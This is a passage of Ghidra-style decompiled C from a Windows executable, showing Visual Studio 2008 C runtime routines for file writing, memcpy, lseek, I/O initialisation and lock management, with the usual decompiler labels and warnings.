        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_0041b54f;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_0041b55b;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_0041b24f;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_0041b0b6;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_0041b0b6:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0041b54f;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_0041b54f;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_0041b54f;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_0041b54f;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_0041b55b;
    }
LAB_0041b564:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_0041b5de;
    }
  }
LAB_0041b5a0:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_0041b5de:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0041b6bd();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041b6bd(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0041b8b3_caseD_2;
        case 3:
          goto switchD_0041b8b3_caseD_3;
        }
        goto switchD_0041b8b3_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0041b8b3_caseD_0;
      case 1:
        goto switchD_0041b8b3_caseD_1;
      case 2:
        goto switchD_0041b8b3_caseD_2;
      case 3:
        goto switchD_0041b8b3_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0041b8b3_caseD_2;
            case 3:
              goto switchD_0041b8b3_caseD_3;
            }
            goto switchD_0041b8b3_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0041b8b3_caseD_2;
            case 3:
              goto switchD_0041b8b3_caseD_3;
            }
            goto switchD_0041b8b3_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0041b8b3_caseD_2;
            case 3:
              goto switchD_0041b8b3_caseD_3;
            }
            goto switchD_0041b8b3_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0041b8b3_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0041b8b3_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0041b8b3_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0041b8b3_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_00438ea4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0041b72c_caseD_2;
      case 3:
        goto switchD_0041b72c_caseD_3;
      }
      goto switchD_0041b72c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0041b72c_caseD_0;
    case 1:
      goto switchD_0041b72c_caseD_1;
    case 2:
      goto switchD_0041b72c_caseD_2;
    case 3:
      goto switchD_0041b72c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041b72c_caseD_2;
          case 3:
            goto switchD_0041b72c_caseD_3;
          }
          goto switchD_0041b72c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041b72c_caseD_2;
          case 3:
            goto switchD_0041b72c_caseD_3;
          }
          goto switchD_0041b72c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041b72c_caseD_2;
          case 3:
            goto switchD_0041b72c_caseD_3;
          }
          goto switchD_0041b72c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0041b72c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0041b72c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0041b72c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0041b72c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_0041bb7c();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041bb7c(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x41bb92;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_0041bdd1:
    iVar7 = -1;
  }
  else {
    DAT_00437d68 = 0x20;
    DAT_00437d80 = puVar2;
    for (; puVar2 < DAT_00437d80 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_00437d68 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_00437d68,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_00437d80)[local_24] = puVar2;
        DAT_00437d68 = DAT_00437d68 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_00437d80)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_00437d80)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_0041bdd1;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_00437d80 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_0041bdd1;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_00437d68);
    iVar7 = 0;
  }
  return iVar7;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_00436300;
  do {
    if ((&DAT_00433194)[iVar2 * 2] == 1) {
      (&DAT_00433190)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_00433190)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00433190)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00433190;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4332b0);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00433190;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4332b0);
  return;
}



void __cdecl FUN_0041be7c(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00433190)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_00436454 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00433190 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_0041bf4d();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_0041bf4d(void)

{
  FUN_0041be7c(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00433190)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
